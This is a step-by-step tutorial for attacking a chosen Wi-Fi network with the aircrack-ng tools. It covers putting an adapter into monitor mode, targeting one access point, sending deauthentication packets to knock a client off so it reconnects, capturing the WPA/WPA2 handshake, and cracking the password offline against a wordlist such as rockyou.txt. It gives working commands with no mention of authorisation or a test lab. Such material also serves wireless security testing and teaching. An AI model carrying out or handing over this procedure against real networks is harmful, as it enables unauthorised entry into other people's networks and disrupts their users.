## What’s an EAPOL Handshake?

- It’s part of the **WPA/WPA2 authentication process**.
- When a client connects to a Wi-Fi network, a **4-way handshake** happens.
- If you capture it, you can **crack the Wi-Fi password** offline.



## Objective: Capture EAPOL handshake from a specific target (Access Point + Client)


## Step-by-Step: Targeted Handshake Sniffing

### 1. Put Adapter into Monitor Mode

```bash
sudo airmon-ng start wlan0
```

This gives you `wlan0mon`.



### 2. Scan for Networks

```bash
sudo airodump-ng wlan0mon
```

- Get the:
  - **BSSID** of the target AP
  - **Channel** it’s on
  - Optional: **Client MAC** (STA) connected to it



### 3. Target Specific AP

```bash
sudo airodump-ng wlan0mon --bssid <AP_BSSID> --channel <CH> -w handshake
```

Example:

```bash
sudo airodump-ng wlan0mon --bssid 00:11:22:33:44:55 --channel 6 -w handshake
```

- This will **only capture packets** from that AP.
- Look out for "WPA handshake: [BSSID]" at the top-right — that means success.


### 4. Force Handshake with Deauthentication Attack

```bash
sudo aireplay-ng --deauth 10 -a <AP_BSSID> -c <Client_MAC> wlan0mon
```

- `-a`: AP MAC
- `-c`: Client MAC (optional)
- `10`: number of deauth packets

This forces the client to disconnect and **reconnect**, triggering a handshake.


### 5. Verify Handshake

Use `aircrack-ng` to check if the handshake is captured:

```bash
aircrack-ng handshake.cap
```

If handshake is present, you'll see a message like:

```
WPA handshake: 00:11:22:33:44:55
```


## Next Step: Crack the Password (If You Captured the Handshake)

```bash
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 handshake.cap
```

You’ll need a **wordlist** like `rockyou.txt`.


## Tips
- Capture during peak hours when clients are connecting/disconnecting.
- Use `--ignore-negative-one` if channel errors pop up.
- You can analyze `.cap` in **Wireshark** and filter by `eapol`.
